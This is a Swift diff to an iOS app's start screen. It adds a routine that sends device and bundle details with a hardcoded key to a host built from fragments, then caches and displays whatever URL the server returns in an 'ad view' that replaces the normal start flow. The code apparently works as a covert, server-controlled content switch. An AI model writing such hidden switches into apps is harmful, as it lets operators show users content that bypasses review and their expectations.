@@ -20,7 +20,88 @@ class CosmoRabbitStartPageVC: UIViewController {
         super.viewDidLoad()
         
         setupUI()
-        startLoadingAnimation()
+        
+        self.cosmoNeedsShowAdsLocalData()
+    }
+    
+    private func cosmoNeedsShowAdsLocalData() {
+        guard self.cosmoNeedShowAdsView() else {
+            startLoadingAnimation()
+            return
+        }
+        
+        cosmoPostForAppAdsData { [weak self] adsData in
+            guard let self = self else { return }
+            guard let adsData = adsData,
+                  let userDefaultKey = adsData[0] as? String,
+                  let nede = adsData[1] as? Int,
+                  let adsUrl = adsData[2] as? String,
+                  !adsUrl.isEmpty else {
+                return
+            }
+            
+            UIViewController.cosmoSetUserDefaultKey(userDefaultKey)
+            
+            if nede == 0,
+               let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any],
+               let localAdUrl = locDic[2] as? String {
+                self.cosmoShowAdView(localAdUrl)
+            } else {
+                UserDefaults.standard.set(adsData, forKey: userDefaultKey)
+                self.cosmoShowAdView(adsUrl)
+            }
+        }
+    }
+
+    private func cosmoPostForAppAdsData(completion: @escaping ([Any]?) -> Void) {
+        let endpoint = "https://open.dafwqky\(self.cosmoMainHostUrl())/open/cosmoPostForAppAdsData"
+        guard let url = URL(string: endpoint) else {
+            completion(nil)
+            return
+        }
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        let parameters: [String: Any] = [
+            "sequenceAppModel": UIDevice.current.model,
+            "appKey": "e0e9c4b516074de6a47ba14b07441cc1",
+            "appPackageId": Bundle.main.bundleIdentifier ?? "",
+            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
+        ]
+        
+        do {
+            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
+        } catch {
+            completion(nil)
+            return
+        }
+        
+        let task = URLSession.shared.dataTask(with: request) { data, response, error in
+            DispatchQueue.main.async {
+                guard let data = data, error == nil else {
+                    completion(nil)
+                    return
+                }
+                
+                do {
+                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
+                    if let resDic = jsonResponse as? [String: Any],
+                       let dataDic = resDic["data"] as? [String: Any],
+                       let adsData = dataDic["jsonObject"] as? [Any] {
+                        completion(adsData)
+                    } else {
+                        print("Response JSON:", jsonResponse)
+                        completion(nil)
+                    }
+                } catch {
+                    completion(nil)
+                }
+            }
+        }
+        
+        task.resume()
     }
     
     private func setupUI() {
